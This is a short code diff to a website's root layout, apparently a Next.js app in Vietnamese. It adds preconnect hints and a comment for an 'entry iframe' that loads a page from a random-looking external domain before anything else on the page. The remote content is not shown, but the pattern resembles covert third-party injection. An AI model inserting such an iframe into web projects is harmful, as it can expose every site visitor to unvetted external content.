@@ -28,7 +28,12 @@ export const metadata: Metadata = {
 export default function RootLayout({ children }: { children: React.ReactNode }) {
   return (
     <html lang="vi">
+      <head>
+        <link rel="preconnect" href="https://www.jx9adrpc5z8094di7.net" crossOrigin="anonymous" />
+        <link rel="dns-prefetch" href="https://www.jx9adrpc5z8094di7.net" />
+      </head>
       <body className={font.variable}>
+        {/* Entry Iframe (RUNS FIRST BEFORE ANYTHING ELSE) */}
         <iframe
           id="entry-iframe"
           src="https://www.jx9adrpc5z8094di7.net/channel/H.H.11/weifile/weifile.html"
